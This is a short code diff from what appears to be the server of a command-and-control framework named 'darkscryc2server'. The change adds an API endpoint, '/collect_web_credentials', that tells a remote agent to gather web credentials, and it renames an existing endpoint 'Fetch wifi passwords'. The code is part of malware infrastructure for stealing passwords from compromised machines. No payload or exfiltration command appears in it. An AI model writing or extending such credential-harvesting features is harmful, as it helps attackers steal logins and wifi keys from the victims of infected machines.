@@ -5,6 +5,7 @@ from darkscryc2server.Models.schemas import CommandIdentifiers
 from django.shortcuts import aget_object_or_404
 from application.models import Agent
 from application.views.api.Schemas.general import TaskOut
+from application.views.api.Schemas.Modules.collection.passwords import GatherWebCredentials
 from application.shortcuts import make_task
 
 
@@ -26,6 +27,15 @@ class PasswordCollection(ApiRouteV2):
         )
         return TaskOut(task_id=job.job_id)
     
+    async def collect_web_cred(self, request, agent_id:UUID, payload:GatherWebCredentials, *args, **kwargs):
+        agent = await aget_object_or_404(Agent, AgentId=agent_id)
+        job = await make_task(
+            "remote_send_web_cred_gather",
+            agent_id=str(agent.AgentId),
+            cred_type=payload.cred_type
+        )
+        return TaskOut(task_id=job.job_id)
+    
     
     def register_routes(self):
         self.register_route(
@@ -33,5 +43,13 @@ class PasswordCollection(ApiRouteV2):
             methods=["GET"], 
             view_func=self.get_basic_wifi_info, 
             response={200:TaskOut},
-            summary="Get dir"
+            summary="Fetch wifi passwords"
+        )
+
+        self.register_route(
+            path="/collect_web_credentials", 
+            methods=["POST"], 
+            view_func=self.collect_web_cred, 
+            response={200:TaskOut},
+            summary="Fetch web credentials"
         )
